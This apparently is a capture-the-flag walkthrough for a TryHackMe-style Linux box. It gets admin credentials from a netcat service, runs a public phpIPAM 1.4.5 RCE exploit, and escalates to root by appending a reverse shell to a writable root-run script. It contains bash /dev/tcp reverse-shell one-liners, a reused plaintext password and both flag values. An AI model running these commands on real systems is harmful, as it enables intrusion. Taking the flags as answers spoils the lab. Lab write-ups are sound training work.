# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |
| 1337 | waste   |



# RECONNAISSANCE
---

If we check the website, we can see this:

![Pasted image 20250403160350.png](../../IMAGES/Pasted%20image%2020250403160350.png)

We need some credentials in order to access this, we can check a hidden directory at `robots.txt`:

![Pasted image 20250403160417.png](../../IMAGES/Pasted%20image%2020250403160417.png)

That just takes us to a Youtube video:


![Pasted image 20250403160441.png](../../IMAGES/Pasted%20image%2020250403160441.png)


If we recall our nmap scan, we can see a strange service running at `1337`, something called `waste`, let's interact with it using netcat:

```
nc IP 1337
```


If we follow the string of the conversation, we can see this:

![Pasted image 20250403160543.png](../../IMAGES/Pasted%20image%2020250403160543.png)

Right answer is bulldog, we can get this by either trying many times or just checking the theme of the room:

![Pasted image 20250403160710.png](../../IMAGES/Pasted%20image%2020250403160710.png)

If we answer correctly, we get the following:

![Pasted image 20250403160724.png](../../IMAGES/Pasted%20image%2020250403160724.png)

We got credentials:

```
admin:OllieUnixMontgomery!
```

Since we got the credentials, we can finally go inside the dashboard:

![Pasted image 20250403160828.png](../../IMAGES/Pasted%20image%2020250403160828.png)


# EXPLOITATION
---

We are dealing with something called `phpIPAM 1.4.5`m we can search for an exploit:


![Pasted image 20250403160856.png](../../IMAGES/Pasted%20image%2020250403160856.png)

Let's try it out.

Link: https://www.exploit-db.com/exploits/50963

```
python3 exploit.py -url http://10.10.161.122/ -usr admin -pwd 'OllieUnixMontgomery!' -cmd 'id' --path /var/www/html
```


If we use the exploit correctly, we can see this:

![Pasted image 20250403161633.png](../../IMAGES/Pasted%20image%2020250403161633.png)

There we go, we got `rce`, let's send ourselves a shell, let's go to `evil.php` and use the following command:

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22
```

We need to have our listener ready and once we send the command, we'll notice this:


![Pasted image 20250403162334.png](../../IMAGES/Pasted%20image%2020250403162334.png)

Let's proceed privilege escalation.



# PRIVILEGE ESCALATION
---


First step is stabilizing our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250403162450.png](../../IMAGES/Pasted%20image%2020250403162450.png)

We can reuse the same credentials for user `ollie` inside of the shell, let's do it:

```
ollie:OllieUnixMontgomery!
```

![Pasted image 20250403164153.png](../../IMAGES/Pasted%20image%2020250403164153.png)

Now, we can read the `user.txt` flag:

```
ollie@hackerdog:/tmp$ cat /home/ollie/user.txt
THM{Ollie_boi_is_daH_Cut3st}
```

From here, I tried using linpeas but nothing useful was truly found on here, we can use `pspy` to check on active processes

![Pasted image 20250403164331.png](../../IMAGES/Pasted%20image%2020250403164331.png)

Something weird is being run by root, let's check this feedme stuff:

```
ollie@hackerdog:/tmp$ find / -name feedme 2>/dev/null
/usr/bin/feedme
```

We got a binary called `feedme`, let' see it:

```
ollie@hackerdog:/tmp$ file /usr/bin/feedme
/usr/bin/feedme: Bourne-Again shell script, ASCII text executable
```

```
ls -la /usr/bin/feedme
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
```

We can write on the script, let's simply put a reverse shell on the file and wait for it to be executed again:

```
echo 'bash -c "bash -i >& /dev/tcp/10.6.34.159/9001 0>&1"' >> /usr/bin/feedme
```

Now, set up the listener and wait a bit to see the connection:

![Pasted image 20250403164633.png](../../IMAGES/Pasted%20image%2020250403164633.png)

We got root finally, let's read `root.txt`:

```
root@hackerdog:/# cat /root/root.txt
THM{Ollie_Luvs_Chicken_Fries}
```

![Pasted image 20250403164709.png](../../IMAGES/Pasted%20image%2020250403164709.png)



